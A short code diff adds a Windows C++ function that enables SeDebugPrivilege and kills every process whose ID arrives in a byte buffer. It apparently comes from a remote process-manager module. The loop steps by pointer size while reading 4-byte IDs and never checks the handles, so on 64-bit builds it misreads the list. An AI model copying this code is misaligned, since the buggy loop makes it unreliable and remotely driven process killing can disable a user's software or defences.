@@ -208,3 +208,23 @@ BOOL EnumProcessByToolHelp32(vector<PROCESS_INFORMATION_ITEM>& ProcessInfo)
 
 	return ProcessInfo.size() > 0 ? TRUE : FALSE;
 }
+
+VOID KillProcess(LPBYTE BufferData, UINT BufferLength)
+{
+	HANDLE ProcessHandle = NULL;
+	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);;  //提权
+
+	for (int i = 0; i < BufferLength; i += sizeof(HANDLE))
+		//因为结束的可能个不止是一个进程
+	{
+		//打开进程
+		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(BufferData + i));
+		//结束进程
+		TerminateProcess(ProcessHandle, 0);
+		CloseHandle(ProcessHandle);
+	}
+	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);;  //还原提权
+	// 稍稍Sleep下，防止出错
+	Sleep(100);
+
+}
